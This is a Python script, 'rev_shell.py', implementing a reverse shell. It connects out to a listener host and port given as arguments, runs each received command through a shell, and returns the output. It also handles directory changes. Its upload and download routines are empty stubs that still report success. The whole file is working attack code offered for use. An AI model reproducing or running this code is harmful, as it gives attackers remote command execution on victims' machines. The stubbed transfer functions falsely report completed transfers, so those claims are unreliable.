#!/usr/bin/env python3
import subprocess
import socket
import argparse
import errno
import sys
import platform
import os

""" Reverse Shell v1.1 """
""" Establishes a simple reverse shell connection """
""" Does not support commands like cd, alias, etc. """

# Arguments
def get_args():
    parser = argparse.ArgumentParser(
        prog="rev_shell.py",
        usage="%(prog)s [options]",
        add_help=True,
        allow_abbrev=True,
    )

    # Define arguments (don't set default if arg is required, leave in for debugging)
    group = parser.add_mutually_exclusive_group(required=False)
    parser.add_argument("-i", "--interface", required=False, type=str.lower, default="wlan0", metavar="", help="specify target interface (default: wlan0)")
    parser.add_argument("-t", "--target", required=True, type=str.lower, metavar="", help="specify target host")
    parser.add_argument("-p", "--port", required=True, type=int, metavar="", help="specify target port")

    return parser.parse_args(), parser

# Display help message / options
def get_help(parser):
    parser.print_help()
    sys.exit(1)                 # Exit with an error code

# Connect to listener
def connect(target, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target, port))
        session(s)
    except socket.error as e:
        if e.errno == errno.ECONNREFUSED:
            print("[-] Connection refused")
        elif e.errno == errno.EADDRINUSE:
            print("[-] Port already in use")
        else:
            print(f"A general socket error occurred: {e}\n")

# Once session is established
def session(s):
    current_dir = os.getcwd()
    s.settimeout(30.0) # Increase this or remove later to make shell more stable
    
    try:
        s.send(b"[+] Session established\n")

        while True:
            # Set cwd as prompt
            s.send(f"\n[{current_dir}]> ".encode())

            # Receive command from user input
            command = s.recv(4096).decode().strip() 

            # Special commands
            if command.lower() == "exit":
                break
            elif command.lower().startswith("cd"):
                previous_dir = current_dir
                target_dir = command[2:].strip() if command.lower().startswith("cd ") else "" # Error handling for empty cd commands
                try:
                    if not target_dir: # If user enters nothing after cd, change to user's home directory
                        target_dir = os.path.expanduser("~")
                    print(f"Changing directory to {target_dir}")
                    os.chdir(target_dir)
                    current_dir = os.getcwd() # Update current_dir
                except (FileNotFoundError, PermissionError) as e:
                    s.send(f"[-] An error occurred: {e}\n".encode())
                    current_dir = previous_dir

            elif command.lower() == "upload":
                upload(s)
                #continue
            elif command.lower() == "download":
                download(s)
                #continue
            # If not a special circumstance, execute other commands as normal
            else: 
                prochandle = subprocess.Popen(command, cwd=current_dir, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                results, errors = prochandle.communicate(timeout=60.0)
                results += errors
                print(f"{command}: {results.decode()}") # Debug: Echo commands
                s.send(results) # Send output back to client

    except Exception as e:
        print(f"[-] An error occurred: {e}\n")
    finally:
        s.close()
        print("[-] Session closed.")

# Upload
def upload(s):
    s.send("[+] Specify full path of file to upload: ".encode())
    upfile = s.recv(4096).decode().strip()
    s.send("[+] Specify full path of destination: ".encode())
    dest = s.recv(4096).decode().strip()

    try:
        # Code to upload file from upfile to dest
        s.send("[+] File upload complete.\n".encode())
    except:
        s.send("[-] File upload failed. Check paths and permissions.\n".encode())

# Download
def download(s):
    s.send("[+] Specify full path of file to download: ".encode())
    downfile = s.recv(4096).decode().strip()
    s.send("[+] Specify full path of destination: ".encode())
    dest = s.recv(4096).decode().strip()

    try:
        # Code to download file from upfile to dest
        s.send("[+] File download complete.\n".encode())
    except:
        s.send("[-] File download failed. Check paths and permissions.\n".encode())

# Main
def main():
    args, parser = get_args()   # args = Defined arguments specified by user, parser = script settings

    # Only useful if no arguments are required
    #if len(sys.argv) == 1:      # If no other arguments are specified (program name counts as 1 argument)
    #    get_help(parser)
    #    print("[+] No arguments specified, using default values.\n\n")

    connect(args.target, args.port) # Script remains in connect() and session() until closed

if __name__ == "__main__":
    main()
